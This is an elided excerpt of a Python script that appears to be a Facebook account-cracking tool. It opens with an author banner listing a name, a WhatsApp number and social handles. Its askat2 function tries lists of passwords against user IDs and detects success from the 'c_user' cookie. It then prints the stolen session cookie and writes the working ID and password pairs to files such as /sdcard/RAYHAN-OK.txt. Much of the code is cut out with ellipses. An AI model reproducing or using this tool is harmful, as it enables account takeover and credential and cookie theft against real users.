...
\x1b[1;96m┏─══─━══─══━─══─| ✠ |─══━─══─══━─══─┓
\x1b[38;5;46m┃AUTHOR    ; RAYHAN AHMED   ┃
\x1b[1;93m┃WHATSAPP  ; +8801300558774         ┃
\x1b[1;95m┃FACEBOOK  ; MARK RAYHAN         ┃
\x1b[1;91m┃GITHUB    ; RAYHAN-6T9        ┃
\x1b[1;96m┗─══─━════─━─══─| ✠ |─══━─══─══━─══─┛
...
def Main():
        os.system("clear")
        os.system('xdg-open')
        os.system('espeak -a 300 "WELCOME TO RAYHAN RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    print(' [+] OK Ids saved in RAYHAN/OK.txt')
    print(' [+] CP Ids saved in RAYHAN/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def askat2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[RAYHAN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[RAYHAN-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[RAYHAN-CP☠️] {uid}|{ps}")
                open('/sdcard/RAYHAN-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
